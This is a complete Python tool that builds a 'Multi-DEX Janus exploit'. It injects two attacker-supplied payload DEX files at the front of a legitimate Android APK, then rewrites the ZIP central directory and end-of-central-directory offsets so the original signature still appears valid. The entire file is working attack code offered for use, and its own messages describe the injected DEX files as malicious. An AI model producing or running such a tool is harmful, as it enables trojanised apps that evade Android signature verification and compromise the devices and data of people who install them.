#!/usr/bin/env python3
# make_janus_multidex.py - Multi-DEX Janus exploit

import struct, sys, zlib, io

if len(sys.argv) != 5:
    print("Usage: make_janus_multidex.py  orig.apk  payload_classes.dex  payload_classes2.dex  out.apk")
    sys.exit(1)

orig_path, dex1_path, dex2_path, out_path = sys.argv[1:]

# Load files
with open(orig_path, 'rb') as f:
    orig = f.read()
with open(dex1_path, 'rb') as f:
    dex1 = f.read()
with open(dex2_path, 'rb') as f:
    dex2 = f.read()

print(f"📱 Original APK: {len(orig)} bytes")
print(f"💀 Payload classes.dex: {len(dex1)} bytes")
print(f"💀 Payload classes2.dex: {len(dex2)} bytes")

def create_dex_entry(name, dex_data):
    """Create a ZIP local file header + data for a DEX file"""
    buf = io.BytesIO()
    w = buf.write
    w(b'PK\x03\x04')                   # local-file sig
    w(b'\x14\x00')                     # min version
    w(b'\x00\x00')                     # gp flags
    w(b'\x00\x00')                     # compression = STORE
    w(b'\x00\x00\x00\x00')             # mod time/date
    w(struct.pack('<I', zlib.crc32(dex_data) & 0xffffffff))
    w(struct.pack('<I', len(dex_data)))     # comp size
    w(struct.pack('<I', len(dex_data)))     # uncomp size
    w(struct.pack('<H', len(name)))         # name length
    w(b'\x00\x00')                         # extra length
    w(name); w(dex_data)
    return buf.getvalue()

# Create both DEX entries
lfh1 = create_dex_entry(b'classes.dex', dex1)
lfh2 = create_dex_entry(b'classes2.dex', dex2)

# Calculate padding to ensure proper alignment for native libraries
# Android requires native libraries to be page-aligned (4096 bytes)
current_size = len(lfh1) + len(lfh2)
page_size = 4096
padding_needed = (page_size - (current_size % page_size)) % page_size

# Add padding to the second DEX entry if needed
if padding_needed > 0:
    lfh2 += b'\x00' * padding_needed
    print(f"🔧 Added {padding_needed} bytes of padding for native library alignment")

total_shift = len(lfh1) + len(lfh2)

print(f"🔧 Total injection size: {total_shift} bytes")

# Find EOCD and parse ZIP structure
eocd_sig = b'PK\x05\x06'
eocd_off = orig.rfind(eocd_sig)
if eocd_off < 0:
    sys.exit("Error: EOCD not found")
    
total_entries = struct.unpack_from('<H', orig, eocd_off + 10)[0]
cd_size = struct.unpack_from('<I', orig, eocd_off + 12)[0]
cd_offset = struct.unpack_from('<I', orig, eocd_off + 16)[0]
cd_start, cd_end = cd_offset, cd_offset + cd_size

print(f"🗂️  Found {total_entries} entries in Central Directory")

# Patch Central Directory offsets
cd = bytearray(orig[cd_start:cd_end])
p = 0
for _ in range(total_entries):
    if cd[p:p+4] != b'PK\x01\x02':
        sys.exit(f"Bad CD signature at {p}")
    old_off = struct.unpack_from('<I', cd, p+42)[0]
    struct.pack_into('<I', cd, p+42, old_off + total_shift)
    name_len, extra_len, cmt_len = struct.unpack_from('<HHH', cd, p+28)
    p += 46 + name_len + extra_len + cmt_len

# Patch EOCD
patched_eocd = bytearray(orig[eocd_off:eocd_off+22])
struct.pack_into('<I', patched_eocd, 16, cd_offset + total_shift)
eocd_comment = orig[eocd_off+22:]

# Write the multi-DEX Janus APK
with open(out_path, 'wb') as w:
    w.write(lfh1)                    # malicious classes.dex FIRST
    w.write(lfh2)                    # malicious classes2.dex SECOND  
    w.write(orig[:cd_start])         # original content
    w.write(cd)                      # patched Central Directory
    w.write(patched_eocd)            # patched EOCD
    w.write(eocd_comment)

print(f"✅ Created multi-DEX Janus APK: {out_path}")
print(f"   📊 Size: {len(open(out_path, 'rb').read())} bytes")
print(f"   🔍 Both malicious DEX files injected at beginning")
